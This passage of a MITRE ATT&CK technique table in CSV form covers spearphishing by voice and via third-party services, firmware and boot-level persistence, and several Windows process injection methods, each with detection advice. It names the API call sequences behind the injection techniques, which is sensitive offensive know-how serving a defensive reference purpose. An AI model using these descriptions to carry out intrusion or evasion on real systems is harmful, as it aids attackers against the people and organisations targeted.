FIN4 Video Dec 2014),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Cyble Sidewinder September 2020),(Citation: TrendMicro Confucius APT Aug 2021),(Citation: ESET Lazarus Jun 2020),(Citation: CISA AppleJeus Feb 2021),(Citation: AADInternals Documentation),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Trend Micro Black Basta October 2022),(Citation: Picus Emotet Dec 2018),(Citation: Proofpoint TA2541 February 2022),(Citation: Secureworks IRON RITUAL USAID Phish May 2021),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: CISA AA21-200A APT40 July 2021),(Citation: FireEye APT32 April 2020),(Citation: Kaspersky MoleRATs April 2019),(Citation: Cylance Machete Mar 2017),(Citation: Symantec Elderwood Sept 2012),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: Cylance Dust Storm),(Citation: SANS Windshift August 2018),(Citation: MSTIC NOBELIUM May 2021),(Citation: Threatpost Hancitor),(Citation: Symantec Patchwork),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Trend Micro TA505 June 2019),(Citation: Secureworks Cobalt Gypsy Feb 2017),(Citation: CIS Emotet Apr 2017),(Citation: ESET Machete July 2019),(Citation: Symantec Emotet Jul 2018),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Mandiant APT1),(Citation: Symantec Elfin Mar 2019),(Citation: ESET Zebrocy May 2019),(Citation: Proofpoint Bumblebee April 2022),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: CSM Elderwood Sept 2012),(Citation: Google Election Threats October 2020),(Citation: Cyberreason Anchor December 2019),(Citation: Kaspersky LuminousMoth July 2021),(Citation: Trend Micro Qakbot December 2020),(Citation: Talos Cobalt Group July 2018),(Citation: Cybereason Oceanlotus May 2017),(Citation: IBM Grandoreiro April 2020),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: Unit 42 NETWIRE April 2020),(Citation: Kaspersky QakBot September 2021),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Cybereason Bazar July 2020),(Citation: KISA Operation Muzabi),(Citation: ATT Sidewinder January 2021),(Citation: ESET OceanLotus),(Citation: McAfee Dianxun March 2021),(Citation: ESET Operation Spalax Jan 2021),(Citation: ESET Turla Mosquito Jan 2018),(Citation: FireEye APT29 Nov 2018),(Citation: US District Court Indictment GRU Oct 2018),(Citation: Talos Oblique RAT March 2021),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: McAfee Night Dragon),(Citation: Mandiant No Easy Breach),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: Malwarebytes Emotet Dec 2017),(Citation: FireEye APT39 Jan 2019),(Citation: Secureworks GOLD KINGSWOOD September 2018),(Citation: TrendMicro BlackTech June 2017),(Citation: Proofpoint TA505 October 2019),(Citation: Talos Transparent Tribe May 2021),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: ESET EvilNum July 2020),(Citation: Group IB Ransomware September 2020),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: ClearSky Lazarus Aug 2020),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Malwarebytes Pony April 2016),(Citation: ATT QakBot April 2021),(Citation: FireEye APT33 Sept 2017),(Citation: US-CERT Emotet Jul 2018),(Citation: Trend Micro Qakbot May 2020),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: Proofpoint TA505 Jan 2019),(Citation: Proofpoint TA505 Sep 2017),(Citation: Google EXOTIC LILY March 2022),(Citation: EST Kimsuky April 2019),(Citation: Anomali Static Kitten February 2021),(Citation: Microsoft Targeting Elections September 2020),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: Kroll Qakbot June 2020),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Cybereason Bumblebee August 2022),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: Microsoft Anti Spoofing),(Citation: ACSC Email Spoofing)"
T1566.004,attack-pattern--bb5e59c4-abe7-40c7-8196-e373cb1e5974,Phishing: Spearphishing Voice,"Adversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that is employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.

All forms of phishing are electronically delivered social engineering. In this scenario, adversaries are not directly sending malware to a victim vice relying on [User Execution](https://attack.mitre.org/techniques/T1204) for delivery and execution. For example, victims may receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools ([Remote Access Software](https://attack.mitre.org/techniques/T1219)) onto their computer.(Citation: Unit42 Luna Moth)

Adversaries may also combine voice phishing with [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621) in order to trick users into divulging MFA credentials or accepting authentication prompts.(Citation: Proofpoint Vishing)",https://attack.mitre.org/techniques/T1566/004,07 September 2023,15 October 2023,enterprise-attack,1.0,Initial Access,,"Google Workspace, Linux, Office 365, SaaS, Windows, macOS",Application Log: Application Log Content,True,T1566,,,,,,,,"(Citation: Crowdstrike TELCO BPO Campaign December 2022),(Citation: CISA Phishing)"
T1566.003,attack-pattern--f6ad61ee-65f3-4bd0-a3f5-2f0accb36317,Phishing: Spearphishing via Service,"Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. 

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.

A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",https://attack.mitre.org/techniques/T1566/003,02 March 2020,30 March 2023,enterprise-attack,2.0,Initial Access,"Because most common third-party services used for spearphishing via service leverage TLS encryption, SSL/TLS inspection is generally required to detect the initial communication/delivery. With SSL/TLS inspection intrusion detection signatures or other security gateway appliances may be able to detect malware. 

Anti-virus can potentially detect malicious documents and files that are downloaded on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts.","Linux, Windows, macOS","Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1566,,,,,,,,"(Citation: Google EXOTIC LILY March 2022),(Citation: FireEye APT34 July 2019),(Citation: MSTIC NOBELIUM May 2021),(Citation: ESET Lazarus Jun 2020),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: ClearSky Lazarus Aug 2020),(Citation: Microsoft Phosphorus Mar 2019),(Citation: FireEye Operation Saffron Rose 2013),(Citation: Lookout Dark Caracal Jan 2018),(Citation: Google TAG Lazarus Jan 2021),(Citation: SecureWorks Mia Ash July 2017),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: ClearSky Kittens Back 3 August 2020),(Citation: SANS Windshift August 2018),"
T1542.003,attack-pattern--1b7b1806-7746-41a1-a35d-e48dae25ddba,Pre-OS Boot: Bootkit,"Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.

A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)

The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.",https://attack.mitre.org/techniques/T1542/003,19 December 2019,30 March 2023,enterprise-attack,1.1,"Defense Evasion, Persistence",Perform integrity checking on MBR and VBR. Take snapshots of MBR and VBR and compare against known good samples. Report changes to MBR and VBR as they occur for indicators of suspicious activity and further analysis.,"Linux, Windows",Drive: Drive Modification,True,T1542,"Anti-virus, File monitoring, Host intrusion prevention systems",,"Administrator, SYSTEM",,,,,"(Citation: Microsoft WhisperGate January 2022),(Citation: Medium S2W WhisperGate January 2022),(Citation: Cybereason WhisperGate February 2022),(Citation: FinFisher Citation),(Citation: Cisco Ukraine Wipers January 2022),(Citation: FireEye BOOTRASH SANS),(Citation: FireEye Bootkits),(Citation: Novetta Blockbuster Destructive Malware),(Citation: Novetta Blockbuster),(Citation: ESET Carberp March 2012),(Citation: FireEye APT41 Aug 2019),(Citation: Eclypsium Trickboot December 2020),(Citation: Crowdstrike WhisperGate January 2022),(Citation: ESET Sednit Part 3),(Citation: Microsoft FinFisher March 2018),(Citation: Mandiant M Trends 2016),(Citation: TechNet Secure Boot Process),(Citation: TCG Trusted Platform Module)"
T1542.002,attack-pattern--791481f8-e96a-41be-b089-a088763083d4,Pre-OS Boot: Component Firmware,"Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1542/001) but conducted upon other system components/devices that may not have the same capability or level of integrity checking.

Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",https://attack.mitre.org/techniques/T1542/002,19 December 2019,01 April 2022,enterprise-attack,1.1,"Defense Evasion, Persistence","Data and telemetry from use of device drivers (i.e. processes and API calls) and/or provided by SMART (Self-Monitoring, Analysis and Reporting Technology) disk monitoring may reveal malicious manipulations of components.(Citation: SanDisk SMART)(Citation: SmartMontools) Otherwise, this technique may be difficult to detect since malicious activity is taking place on system components possibly outside the purview of OS security and integrity mechanisms.

Disk check and forensic utilities may reveal indicators of malicious firmware such as strings, unexpected disk partition table entries, or blocks of otherwise unusual memory that warrant deeper investigation.(Citation: ITWorld Hard Disk Health Dec 2014) Also consider comparing components, including hashes of component firmware and behavior, against known good images.","Linux, Windows, macOS","Driver: Driver Metadata, Firmware: Firmware Modification, Process: OS API Execution",True,T1542,"Anti-virus, File monitoring, Host intrusion prevention systems",,SYSTEM,,Ability to update component device firmware from the host operating system.,,,"(Citation: NCSC Cyclops Blink February 2022),(Citation: Kaspersky Equation QA),"
T1542.004,attack-pattern--a6557c75-798f-42e4-be70-ab4502e0a3bc,Pre-OS Boot: ROMMONkit,"Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. (Citation: Cisco Synful Knock Evolution)(Citation: Cisco Blog Legacy Device Attacks)


ROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to [TFTP Boot](https://attack.mitre.org/techniques/T1542/005), an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.",https://attack.mitre.org/techniques/T1542/004,20 October 2020,22 October 2020,enterprise-attack,1.0,"Defense Evasion, Persistence","There are no documented means for defenders to validate the operation of the ROMMON outside of vendor support. If a network device is suspected of being compromised, contact the vendor to assist in further investigation.",Network,Firmware: Firmware Modification,True,T1542,,,Administrator,,,,,",(Citation: Cisco IOS Software Integrity Assurance - Secure Boot),(Citation: Cisco IOS Software Integrity Assurance - Image File Verification),(Citation: Cisco IOS Software Integrity Assurance - Change Control),(Citation: Cisco IOS Software Integrity Assurance - Image File Integrity)"
T1542.001,attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada,Pre-OS Boot: System Firmware,"Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. (Citation: Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: About UEFI)

System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",https://attack.mitre.org/techniques/T1542/001,19 December 2019,30 March 2023,enterprise-attack,1.0,"Defense Evasion, Persistence","System firmware manipulation may be detected. (Citation: MITRE Trustworthy Firmware Measurement) Dump and inspect BIOS images on vulnerable systems and compare against known good images. (Citation: MITRE Copernicus) Analyze differences to determine if malicious changes have occurred. Log attempts to read/write to BIOS and compare against known patching behavior.

Likewise, EFI modules can be collected and compared against a known-clean list of EFI executable binaries to detect potentially malicious modules. The CHIPSEC framework can be used for analysis to determine if firmware modifications have been performed. (Citation: McAfee CHIPSEC Blog) (Citation: Github CHIPSEC) (Citation: Intel HackingTeam UEFI Rootkit)",Windows,Firmware: Firmware Modification,True,T1542,"Anti-virus, File monitoring, Host intrusion prevention systems","Jean-Ian Boutin, ESET; McAfee; Ryan Becwar","Administrator, SYSTEM",,,,,"(Citation: TrendMicro Hacking Team UEFI),(Citation: ESET LoJax Sept 2018),(Citation: Ge 2011),(Citation: Intel Hardware-based Security Technologies),(Citation: ESET LoJax Sept 2018),(Citation: TCG Trusted Platform Module)"
T1542.005,attack-pattern--28abec6c-4443-4b03-8206-07f2e264a6b4,Pre-OS Boot: TFTP Boot,"Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.

Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with [Modify System Image](https://attack.mitre.org/techniques/T1601) to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) and may result in the network device running a modified image. (Citation: Cisco Blog Legacy Device Attacks)",https://attack.mitre.org/techniques/T1542/005,20 October 2020,22 October 2020,enterprise-attack,1.0,"Defense Evasion, Persistence","Consider comparing a copy of the network device configuration and system image against a known-good version to discover unauthorized changes to system boot, startup configuration, or the running OS. (Citation: Cisco IOS Software Integrity Assurance - Secure Boot) (Citation: Cisco IOS Software Integrity Assurance - Image File Verification)The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor.  (Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)

Review command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration. (Citation: Cisco IOS Software Integrity Assurance - Command History) Check boot information including system uptime, image booted, and startup configuration to determine if results are consistent with expected behavior in the environment. (Citation: Cisco IOS Software Integrity Assurance - Boot Information) Monitor unusual connections or connection attempts to the device that may specifically target TFTP or other file-sharing protocols.",Network,"Command: Command Execution, Firmware: Firmware Modification, Network Traffic: Network Connection Creation",True,T1542,,,Administrator,,,,,",(Citation: Cisco IOS Software Integrity Assurance - Secure Boot),(Citation: Cisco IOS Software Integrity Assurance - Image File Verification),(Citation: Cisco IOS Software Integrity Assurance - AAA),(Citation: Cisco IOS Software Integrity Assurance - TACACS),(Citation: Cisco IOS Software Integrity Assurance - Change Control),(Citation: Cisco IOS Software Integrity Assurance - Image File Integrity)"
T1055.004,attack-pattern--7c0f17c9-1af6-4628-9cbd-9e45482dd605,Process Injection: Asynchronous Procedure Call,"Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. 

APC injection is commonly performed by attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state.(Citation: Microsoft APC) A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can be used to invoke a function (such as <code>LoadLibrayA</code> pointing to a malicious DLL). 

A variation of APC injection, dubbed ""Early Bird injection"", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.(Citation: Microsoft Atom Table)

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process. ",https://attack.mitre.org/techniques/T1055/004,14 January 2020,18 October 2021,enterprise-attack,1.1,"Defense Evasion, Privilege Escalation","Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",Windows,"Process: OS API Execution, Process: Process Access, Process: Process Modification",True,T1055,"Anti-virus, Application control",,,,,,,"(Citation: Proofpoint Bumblebee April 2022),(Citation: Gigamon BADHATCH Jul 2019),(Citation: Malwarebytes Saint Bot April 2021),(Citation: ESET InvisiMole June 2020),(Citation: ESET Attor Oct 2019),(Citation: IBM IcedID November 2017),(Citation: BitDefender BADHATCH Mar 2021),(Citation: Symantec FIN8 Jul 2023),(Citation: CyberBit Early Bird Apr 2018),(Citation: Trustwave Pillowmint June 2020),(Citation: Bitdefender FIN8 July 2021),(Citation: Prevx Carberp March 2011),"
T1055.001,attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945,Process Injection: Dynamic-link Library Injection,"Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  

DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) 

Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) 

Another variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) 

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ",https://attack.mitre.org/techniques/T1055/001,14 January 2020,11 August 2023,enterprise-attack,1.3,"Defense Evasion, Privilege Escalation","Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code> and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)

Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. 

Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",Windows,"Module: Module Load, Process: OS API Execution, Process: Process Access, Process: Process Metadata, Process: Process Modification",True,T1055,"Anti-virus, Application control",Boominathan Sundaram,User,,,,,"(Citation: Unit 42 Kazuar May 2017),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: Kaspersky TajMahal April 2019),(Citation: Gigamon BADHATCH Jul 2019),(Citation: CarbonBlack Conti July 2020),(Citation: Lotus Blossom Jun 2015),(Citation: FinFisher Citation),(Citation: CopyKittens Nov 2015),(Citation: Airbus Derusbi 2015),(Citation: GitHub PowerSploit May 2012),(Citation: Medium Metamorfo Apr 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: McAfee Maze March 2020),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Lazarus RATANKBA),(Citation: BlackBerry CostaRicto November 2020),(Citation: AlienVault Sykipot 2011),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: Microsoft FinFisher March 2018),(Citation: RATANKBA),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: Picus Emotet Dec 2018),(Citation: Proofpoint TA505 October 2019),(Citation: Joint Cybersecurity Advisory AA23-129A Snake Malware May 2023),(Citation: Proofpoint Bumblebee April 2022),(Citation: Symantec Bumblebee June 2022),(Citation: Symantec W32.Duqu),(Citation: ESET Gelsemium June 2021),(Citation: Talos Cobalt Strike September 2020),(Citation: PowerSploit Documentation),(Citation: F-Secure BlackEnergy 2014),(Citation: Sophos Maze VM September 2020),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: ESET Carberp March 2012),(Citation: Accenture MUDCARP March 2019),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: US-CERT Emotet Jul 2018),(Citation: ESET Carbon Mar 2017),(Citation: IBM MegaCortex),(Citation: Talos ZxShell Oct 2014),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: TrendMicro Netwalker May 2020),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: CheckPoint Naikon May 2020),(Citation: TrendMicro Tropic Trooper Mar 2018),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: Lotus Blossom Dec 2015),(Citation: Cybereason Conti Jan 2021),(Citation: TrendMicro Taidoor),(Citation: Symantec Darkmoon Aug 2005),(Citation: Github Koadic),(Citation: Eset Ramsay May 2020),(Citation: Accenture Dragonfish Jan 2018),(Citation: CrowdStrike Putter Panda),(Citation: CISA ComRAT Oct 2020),(Citation: ESET Sednit Part 3),(Citation: ESET Turla Mosquito May 2018),(Citation: Trend Micro Banking Malware Jan 2019),(Citation: ESET ComRAT May 2020),(Citation: ESET PipeMon May 2020),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: Camba RARSTONE),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Github Rapid7 Meterpreter Elevate),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Symantec Dyre June 2015),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Lazarus APT January 2022),(Citation: IBM TA505 April 2020),(Citation: FireEye Poison Ivy),(Citation: GitHub Pupy),(Citation: TrendMicro Patchwork Dec 2017),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: BiZone Lizar May 2021),"
T1055.011,attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298,Process Injection: Extra Window Memory Injection,"Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. 

Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)

Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.

Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)

Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ",https://attack.mitre.org/techniques/T1055/011,14 January 2020,10 November 2020,enterprise-attack,1.0,"Defense Evasion, Privilege Escalation",Monitor for API calls related to enumerating and manipulating EWM such as GetWindowLong (Citation: Microsoft GetWindowLong function) and SetWindowLong (Citation: Microsoft SetWindowLong function). Malware associated with this technique have also used SendNotifyMessage (Citation: Microsoft SendNotifyMessage function) to trigger the associated window procedure and eventual malicious injection. (Citation: Elastic Process Injection July 2017),Windows,Process: OS API Execution,True,T1055,"Anti-virus, Application control",,,,,,,"(Citation: ESET Recon Snake Nest),(Citation: WeLiveSecurity Gapz and Redyms Mar 2013),(Citation: MalwareTech Power Loader Aug 2013),"
T1055.015,attack-pattern--eb2cb5cb-ae87-4de0-8c35-da2a17aafb99,Process Injection: ListPlanting,"Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process. Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.

List-view controls are user interface windows used to display collections of items.(Citation: Microsoft List View Controls) Information about an application's list-view settings are stored within the process' memory in a <code>SysListView32</code> control.

ListPlanting (a form of message-passing ""shatter attack"") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items.(Citation: Modexp Windows Process Injection) Adversaries must first copy code into the target process’ memory space, which can be performed various ways including by directly obtaining a handle to the <code>SysListView32</code> child of the victim process window (via Windows API calls such as <code>FindWindow</code> and/or <code>EnumWindows</code>) or other [Process Injection](https://attack.mitre.org/techniques/T1055) methods.

Some variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored <code>WriteProcessMemory</code> function. For example, an adversary can use the <code>PostMessage</code> and/or <code>SendMessage</code> API functions to send <code>LVM_SETITEMPOSITION</code> and <code>LVM_GETITEMPOSITION</code> messages, effectively copying a payload 2 bytes at a time to the allocated memory.(Citation: ESET InvisiMole June 2020) 

Finally, the payload is triggered by sending the <code>LVM_SORTITEMS</code> message to the <code>SysListView32</code> child of the process window, with the payload within the newly allocated buffer passed and executed as the <code>ListView_SortItems</code> callback.",https://attack.mitre.org/techniques/T1055/015,22 November 2021,08 March 2022,enterprise-attack,1.0,"Defense Evasion, Privilege Escalation","Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>FindWindow</code>, <code>FindWindowEx</code>, <code>EnumWindows</code>, <code>EnumChildWindows</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be abused for this technique. 

Consider monitoring for excessive use of <code>SendMessage</code> and/or <code>PostMessage</code> API functions with <code>LVM_SETITEMPOSITION</code> and/or <code>LVM_GETITEMPOSITION</code> arguments.

Analyze process behavior to determine if a process is performing unusual actions, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",Windows,"Process: OS API Execution, Process: Process Modification",True,T1055,,ESET,User,,,,,"(Citation: ESET InvisiMole June 2020),"
T1055.002,attack-pattern--806a49c4-970d-43f9-9acc-ac0ee11e6662,Process Injection: Portable Executable Injection,"Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. 

PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. (Citation: Elastic Process Injection July 2017) 

